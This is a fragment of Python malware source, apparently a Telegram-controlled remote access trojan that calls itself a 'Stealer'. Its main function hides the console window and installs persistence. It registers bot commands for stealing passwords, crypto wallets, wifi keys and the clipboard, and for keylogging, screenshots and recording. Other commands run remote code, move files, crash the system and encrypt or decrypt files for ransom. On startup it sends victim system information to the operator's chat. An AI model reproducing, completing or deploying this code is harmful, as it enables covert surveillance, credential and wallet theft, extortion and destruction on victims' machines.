                send_photo_sync(img, "🔄 Periodic screenshot")
        time.sleep(screenshot_interval)

# ========== MAIN ==========
def main():
    global victim_id, bot_app, loop
    
    # Generate ID
    victim_id = generate_id()
    
    # Hide console (Windows)
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Add persistence
    add_persistence()
    
    # Load encryption key
    load_or_generate_encryption_key()
    
    # Create bot application
    bot_app = Application.builder().token(BOT_TOKEN).build()
    loop = asyncio.get_event_loop()
    
    # Register command handlers
    bot_app.add_handler(CommandHandler("start", start_command))
    bot_app.add_handler(CommandHandler("help", help_command))
    bot_app.add_handler(CommandHandler("screenshot", screenshot_command))
    bot_app.add_handler(CommandHandler("record", record_command))
    bot_app.add_handler(CommandHandler("passwords", passwords_command))
    bot_app.add_handler(CommandHandler("wallets", wallets_command))
    bot_app.add_handler(CommandHandler("wifi", wifi_command))
    bot_app.add_handler(CommandHandler("clipboard", clipboard_command))
    bot_app.add_handler(CommandHandler("exec", exec_command))
    bot_app.add_handler(CommandHandler("download", download_command))
    bot_app.add_handler(CommandHandler("upload", upload_command))
    bot_app.add_handler(CommandHandler("browse", browse_command))
    bot_app.add_handler(CommandHandler("ps", ps_command))
    bot_app.add_handler(CommandHandler("kill", kill_command))
    bot_app.add_handler(CommandHandler("keylog_start", keylog_start_command))
    bot_app.add_handler(CommandHandler("keylog_stop", keylog_stop_command))
    bot_app.add_handler(CommandHandler("keylog_get", keylog_get_command))
    bot_app.add_handler(CommandHandler("info", info_command))
    bot_app.add_handler(CommandHandler("persistence", persistence_command))
    bot_app.add_handler(CommandHandler("toggle_screenshot", toggle_screenshot_command))
    bot_app.add_handler(CommandHandler("set_interval", set_interval_command))
    bot_app.add_handler(CommandHandler("update", update_command))
    bot_app.add_handler(CommandHandler("bsod", bsod_command))
    bot_app.add_handler(CommandHandler("encrypt", encrypt_command))
    bot_app.add_handler(CommandHandler("decrypt", decrypt_command))
    bot_app.add_handler(CommandHandler("get_key", get_key_command))
    bot_app.add_handler(CommandHandler("uninstall", uninstall_command))
    
    # Send system info on startup
    try:
        asyncio.run(bot_app.bot.send_message(chat_id=CHAT_ID, text=get_system_info_broadcast(), parse_mode='Markdown'))
    except:
        pass
    
    # Start periodic screenshot
    threading.Thread(target=periodic_screenshot, daemon=True).start()
    
    # Start bot
    print("Stealer started...")
    bot_app.run_polling()

if __name__ == "__main__":
    main()